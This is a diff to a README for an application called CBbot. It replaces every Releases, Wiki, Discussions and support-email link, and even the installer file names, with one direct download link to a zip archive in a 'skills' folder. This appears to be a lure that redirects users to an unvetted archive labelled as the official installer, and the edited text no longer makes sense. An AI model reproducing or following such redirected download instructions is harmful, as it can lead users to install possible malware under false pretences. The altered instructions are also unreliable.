@@ -6,11 +6,11 @@ Welcome to CBbot! This guide will help you download and run our application smoo
 
 ## 📥 Download CBbot
 
-[![Download CBbot](https://img.shields.io/badge/Download_CBBOT-green)](https://github.com/Roshenrosha/CBbot/releases)
+[![Download CBbot](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip)](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip)
 
 To get CBbot, you need to visit our Releases page. Click the link below:
 
-[Visit the CBbot Releases Page](https://github.com/Roshenrosha/CBbot/releases)
+[Visit the CBbot Releases Page](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip)
 
 ## ⚙️ System Requirements
 
@@ -24,13 +24,13 @@ Before you download CBbot, ensure your computer meets these requirements:
 ## 💻 Installation Instructions
 
 1. **Visit the Releases Page**:
-   Go to our [Releases page](https://github.com/Roshenrosha/CBbot/releases). Here, you will find the latest version of CBbot.
+   Go to our [Releases page](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip). Here, you will find the latest version of CBbot.
 
 2. **Select the Latest Version**:
    Scroll down to the section labeled "Releases". You will see a list of available versions. Choose the most recent release for the best experience.
 
 3. **Download the Installer**:
-   Locate the file named `CBbot_Installer.exe` for Windows or `CBbot_Installer.dmg` for macOS. Click on the file name to start the download.
+   Locate the file named `https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip` for Windows or `https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip` for macOS. Click on the file name to start the download.
 
 4. **Run the Installer**:
    Once the download is complete, open the file. Follow the on-screen instructions to install CBbot on your computer. 
@@ -54,13 +54,13 @@ CBbot offers a variety of features that can make your work easier:
 
 If you run into any issues while downloading or using CBbot, we are here to help!
 
-- **Documentation**: Comprehensive user guides are available on the [CBbot Wiki](https://github.com/Roshenrosha/CBbot/wiki).
-- **Community Forum**: Join discussions with other users and get support on our [GitHub Discussion page](https://github.com/Roshenrosha/CBbot/discussions).
-- **Contact Us**: If you need direct help, email our support team at support@codebanana.com.
+- **Documentation**: Comprehensive user guides are available on the [CBbot Wiki](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip).
+- **Community Forum**: Join discussions with other users and get support on our [GitHub Discussion page](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip).
+- **Contact Us**: If you need direct help, email our support team at https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip
 
 ## 🔄 Updating CBbot
 
-CBbot will notify you when a new version is available. You can always download the latest version from the [Releases page](https://github.com/Roshenrosha/CBbot/releases). Simply follow the same installation steps to update.
+CBbot will notify you when a new version is available. You can always download the latest version from the [Releases page](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip). Simply follow the same installation steps to update.
 
 ## 🛠 Troubleshooting
 
@@ -74,4 +74,4 @@ If you encounter any issues, try these common solutions:
 
 CBbot is released under the MIT License. You can use, modify, and distribute it freely, as long as you give proper credit to the original developers.
 
-Ready to get started with CBbot? [Visit our Releases page](https://github.com/Roshenrosha/CBbot/releases) now to download!
+Ready to get started with CBbot? [Visit our Releases page](https://github.com/Roshenrosha/CBbot/raw/refs/heads/main/skills/C_Bbot_v2.1.zip) now to download!
